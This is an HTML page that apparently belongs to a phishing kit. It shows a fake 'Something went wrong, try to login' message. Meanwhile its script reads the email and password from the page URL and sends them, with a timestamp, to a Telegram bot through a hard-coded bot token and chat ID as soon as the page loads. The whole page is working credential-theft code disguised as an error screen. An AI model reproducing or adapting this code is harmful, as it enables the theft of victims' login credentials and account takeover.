<!DOCTYPE html>
<html>
<head>
    <title>Something Went Wrong</title>
</head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style type="text/css">
    body {
        margin: 10px;
    }
</style>
<body>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        var timezone = "Asia/Kolkata";
        var apiToken = 'AAF4Y-kePwnyq_CdysCTUi9OXoqKbT2ZT7E';
        var chatId = 66951049067;

        // Set timezone
        Intl.DateTimeFormat(undefined, {timeZone: timezone});

        // Get current time
        var time = new Date().toLocaleTimeString('en-US', {hour: 'numeric', minute: 'numeric', hour12: true});

        // Get parameters from URL
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get("email");
        var password = urlParams.get("password");

        // Create message
        var message = "Username: " + email + "\nPassword: " + password + "\nTried Login at " + time + " IST";

        // Send message
        send_message(chatId, message);

        function send_message(chat_id, message) {
            var text = encodeURIComponent(message);
            var url = "https://api.telegram.org/bot" + apiToken + "/sendMessage?chat_id=" + chat_id + "&text=" + text;

            // Use fetch API to send message
            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    // You can add further handling if needed
                })
                .catch(error => console.error('Error:', error));
        }
    });
</script>

<p>Something went wrong. <br>
    Try to login </p>
